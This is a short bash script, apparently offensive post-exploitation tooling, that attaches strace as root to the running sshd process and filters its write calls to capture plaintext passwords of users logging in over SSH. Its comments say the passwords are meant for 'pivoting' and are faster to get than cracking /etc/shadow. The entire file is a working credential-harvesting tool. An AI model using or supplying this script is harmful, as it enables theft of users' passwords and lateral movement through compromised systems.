#!/bin/bash
#
# In a facepalm revelation, it has come to my attention that you can use strace as root to collect passwords from sshd
# Passwords are useful for pivoting and can be significantly faster than cracking /etc/shadow
# 9 characters gets padded to 10 characters. 13 characters get padded to 14.
# I've seen padding with 'r' and 't' so far
#

strace -s 64 -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -Eo 'write\(4, "\\0\\0\\0\\[0-9]*[^\]{2,}[^\\0]"' | sed -e 's/write(4, "\\0\\0\\0\\[0-9]*\(.*\)"/\1/g'
